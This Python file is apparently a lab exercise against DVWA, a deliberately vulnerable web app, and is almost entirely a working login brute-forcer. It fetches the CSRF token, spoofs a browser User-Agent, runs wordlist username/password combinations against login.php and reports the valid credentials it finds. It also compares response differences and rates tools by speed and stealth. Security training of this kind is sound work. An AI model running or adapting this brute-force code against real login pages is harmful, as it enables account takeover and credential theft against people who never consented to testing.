import requests
import time
from bs4 import BeautifulSoup
import threading

class DVWABruteForcer:
    def __init__(self, base_url):
        self.base_url = base_url
        self.login_url = f"{base_url}/login.php"
        self.brute_url = f"{base_url}/vulnerabilities/brute/"
        self.session = requests.Session()
        self.found_credentials = []
        self.attempts = 0
        self.start_time = None
        
    def get_csrf_token(self):
        """Obtiene el token CSRF de la página de login"""
        try:
            response = self.session.get(self.login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find('input', {'name': 'user_token'})
            if token_input:
                return token_input.get('value')
        except Exception as e:
            print(f"Error obteniendo CSRF token: {e}")
        return None
    
    def login(self, username, password):
        """Intenta hacer login con las credenciales proporcionadas"""
        try:
            # Primero obtener el CSRF token
            csrf_token = self.get_csrf_token()
            if not csrf_token:
                print("No se pudo obtener CSRF token")
                return False
            
            # Preparar datos del formulario
            login_data = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': csrf_token
            }
            
            # Headers para simular navegador real
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': self.login_url
            }
            
            # Realizar solicitud de login
            response = self.session.post(self.login_url, data=login_data, headers=headers)
            self.attempts += 1
            
            # Verificar si el login fue exitoso
            if "Welcome to" in response.text:
                print(f"[SUCCESS] Credenciales válidas: {username}:{password}")
                self.found_credentials.append((username, password))
                return True
            else:
                if self.attempts % 1000 == 0:  # Mostrar progreso cada 10 intentos
                    print(f"[INFO] Intentos realizados: {self.attempts}")
                return False
                
        except Exception as e:
            print(f"Error durante login: {e}")
            return False
    
    def load_wordlists(self, users_file, passwords_file):
        """Carga los diccionarios de usuarios y contraseñas"""
        try:
            with open(users_file, 'r', encoding='utf-8', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]
            
            with open(passwords_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            print(f"[INFO] Cargados {len(users)} usuarios y {len(passwords)} contraseñas")
            return users, passwords
            
        except Exception as e:
            print(f"Error cargando wordlists: {e}")
            return [], []
    
    def brute_force_attack(self, users_file, passwords_file, max_workers=5):
        """Realiza el ataque de fuerza bruta"""
        users, passwords = self.load_wordlists(users_file, passwords_file)
        
        if not users or not passwords:
            print("[ERROR] No se pudieron cargar las wordlists")
            return
        
        self.start_time = time.time()
        self.found_credentials = []
        self.attempts = 0
        
        print(f"[INICIO] Iniciando ataque de fuerza bruta a las {time.strftime('%H:%M:%S')}")
        print(f"[CONFIG] Usuarios: {len(users)}, Contraseñas: {len(passwords)}, Combinaciones: {len(users) * len(passwords)}")
        
        # Ataque secuencial (más simple para debugging)
        successful_attempts = 0
        
        for user in users:
            for password in passwords:
                if self.login(user, password):
                    successful_attempts += 1
                    if successful_attempts >= 2:  # Encontrar al menos 2 pares
                        break
            if successful_attempts >= 2:
                break
        
        self.print_results()
    
    def performance_test(self, test_credentials):
        """Prueba de rendimiento con credenciales conocidas"""
        print("\n" + "="*50)
        print("PRUEBA DE RENDIMIENTO")
        print("="*50)
        
        times = []
        
        for username, password in test_credentials:
            start_time = time.time()
            success = self.login(username, password)
            end_time = time.time()
            
            if success:
                elapsed = end_time - start_time
                times.append(elapsed)
                print(f"Login {username}:{password} - {elapsed:.4f} segundos")
        
        if times:
            avg_time = sum(times) / len(times)
            print(f"\nTiempo promedio por intento: {avg_time:.4f} segundos")
            print(f"Intentos por segundo: {1/avg_time:.2f}")
        
        return times
    
    def analyze_response_differences(self, valid_user, valid_pass, invalid_user, invalid_pass):
        """Analiza diferencias entre respuestas válidas e inválidas"""
        print("\n" + "="*50)
        print("ANÁLISIS DE DIFERENCIAS EN RESPUESTAS")
        print("="*50)
        
        # Login válido
        csrf_token = self.get_csrf_token()
        valid_data = {
            'username': valid_user,
            'password': valid_pass,
            'Login': 'Login',
            'user_token': csrf_token
        }
        valid_response = self.session.post(self.login_url, data=valid_data)
        
        # Login inválido
        csrf_token = self.get_csrf_token()
        invalid_data = {
            'username': invalid_user,
            'password': invalid_pass,
            'Login': 'Login',
            'user_token': csrf_token
        }
        invalid_response = self.session.post(self.login_url, data=invalid_data)
        
        print("4 DIFERENCIAS PRINCIPALES:")
        print("1. LONGITUD DE CONTENIDO:")
        print(f"   Válido: {len(valid_response.text)} caracteres")
        print(f"   Inválido: {len(invalid_response.text)} caracteres")
        
        print("\n2. PRESENCIA DE MENSAJES:")
        print(f"   Válido: {'Welcome to the password protected area' in valid_response.text}")
        print(f"   Inválido: {'Login failed' in invalid_response.text}")
        
        print("\n3. CABECERAS HTTP:")
        print(f"   Válido - Content-Length: {valid_response.headers.get('Content-Length', 'N/A')}")
        print(f"   Inválido - Content-Length: {invalid_response.headers.get('Content-Length', 'N/A')}")
        
        print("\n4. ESTRUCTURA HTML:")
        valid_soup = BeautifulSoup(valid_response.text, 'html.parser')
        invalid_soup = BeautifulSoup(invalid_response.text, 'html.parser')
        print(f"   Válido - Título: {valid_soup.find('title').text if valid_soup.find('title') else 'N/A'}")
        print(f"   Inválido - Título: {invalid_soup.find('title').text if invalid_soup.find('title') else 'N/A'}")
    
    def print_results(self):
        """Imprime los resultados del ataque"""
        print("\n" + "="*50)
        print("RESULTADOS DEL ATAQUE")
        print("="*50)
        
        end_time = time.time()
        total_time = end_time - self.start_time
        
        print(f"Tiempo total: {total_time:.2f} segundos")
        print(f"Intentos realizados: {self.attempts}")
        print(f"Velocidad: {self.attempts/total_time:.2f} intentos/segundo")
        
        if self.found_credentials:
            print(f"\nCREDENCIALES ENCONTRADAS ({len(self.found_credentials)}):")
            for i, (user, pwd) in enumerate(self.found_credentials, 1):
                print(f"  {i}. Usuario: {user} - Contraseña: {pwd}")
        else:
            print("\nNo se encontraron credenciales válidas")

def compare_tools_performance():
    """Compara el rendimiento entre diferentes herramientas"""
    print("\n" + "="*60)
    print("COMPARACIÓN DE RENDIMIENTO ENTRE HERRAMIENTAS")
    print("="*60)
    
    comparison_data = {
        'Python Script': {
            'speed': 'Media-Alta',
            'detection': 'Media',
            'flexibility': 'Alta',
            'stealth': 'Media',
            'usability': 'Media'
        },
        'Hydra': {
            'speed': 'Alta',
            'detection': 'Alta', 
            'flexibility': 'Media',
            'stealth': 'Baja',
            'usability': 'Alta'
        },
        'Burp Suite': {
            'speed': 'Media',
            'detection': 'Media',
            'flexibility': 'Alta',
            'stealth': 'Media',
            'usability': 'Alta'
        },
        'cURL': {
            'speed': 'Baja',
            'detection': 'Baja',
            'flexibility': 'Baja',
            'stealth': 'Alta',
            'usability': 'Baja'
        }
    }
    
    print(f"{'HERRAMIENTA':<15} {'VELOCIDAD':<12} {'DETECCIÓN':<12} {'FLEXIBILIDAD':<13} {'SIGILO':<10} {'USABILIDAD':<12}")
    print("-" * 80)
    
    for tool, metrics in comparison_data.items():
        print(f"{tool:<15} {metrics['speed']:<12} {metrics['detection']:<12} {metrics['flexibility']:<13} {metrics['stealth']:<10} {metrics['usability']:<12}")

# USO DEL SCRIPT
if __name__ == "__main__":
    # Configuración
    DVWA_URL = "http://localhost/DVWA"
    USERS_FILE = "usuarios.txt"
    PASSWORDS_FILE = "claves.txt"
    
    # Crear instancia del brute forcer
    brute_forcer = DVWABruteForcer(DVWA_URL)
    
    # Realizar ataque de fuerza bruta
    print("INICIANDO ATAQUE DE FUERZA BRUTA CON PYTHON")
    print("=" * 50)
    
    brute_forcer.brute_force_attack(USERS_FILE, PASSWORDS_FILE)
    
    # Si se encontraron credenciales, hacer prueba de rendimiento
    if brute_forcer.found_credentials:
        brute_forcer.performance_test(brute_forcer.found_credentials[:2])  # Probar con las 2 primeras
        
        # Análisis de diferencias (usar una credencial inválida para comparar)
        if len(brute_forcer.found_credentials) >= 1:
            valid_user, valid_pass = brute_forcer.found_credentials[0]
            brute_forcer.analyze_response_differences(
                valid_user, valid_pass, 
                "usuario_invalido", "contraseña_invalida"
            )
    
    # Comparación con otras herramientas
    compare_tools_performance()
    
    print("\n" + "="*50)
    print("EJECUCIÓN COMPLETADA")
    print("="*50)